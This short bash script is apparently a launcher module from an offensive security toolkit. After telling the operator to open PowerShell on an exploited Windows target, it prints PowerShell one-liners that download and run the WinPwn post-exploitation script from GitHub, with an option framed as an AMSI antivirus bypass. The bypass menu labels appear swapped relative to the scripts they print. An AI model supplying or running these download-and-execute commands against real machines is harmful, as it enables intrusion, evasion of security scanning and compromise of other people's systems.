#!/bin/bash
LPATH='/opt/sifter/'
ORNG='\033[0;33m'
NC='\033[0m'
W='\033[1;37m'
LP='\033[1;35m'
YLW='\033[1;33m'
LBBLUE='\e[104m'
RED='\033[0;31m'
LGRY='\033[0;37m'
INV='\e[7m'
BRED='\033[1;31m'
UPURPLE='\033[4;35m'

echo -e "${RED}"
figlet WinPwn
echo -e "${ORNG}"
echo -e "${W}Once you have a shell session open on an exploited target"
echo -e "run ${YLW}pwsh ${W}to open a powershell session"
echo -e "Once you have powershell open, please hit enter"
read RANDOM
PS3='Would you like to load and run WinPwn with AMSI bypass or run WinPwn normally?'
            options=("With Bypass" "Without Bypass")
            select opt in "${options[@]}"
            do
                case $opt in
                    "With Bypass")
                        echo -e "${UBLUE}iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')${NC}"
                        ;;

                    "Without Bypass")
                        echo -e "${UBLUE}iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/ObfusWinPwn.ps1')${NC}"
                        ;;
                esac
            done
        echo -e "${NC}"
        

##########################______________ czFsM250NzggX18gUmFiYjE3J3MgRGVu ______________##########################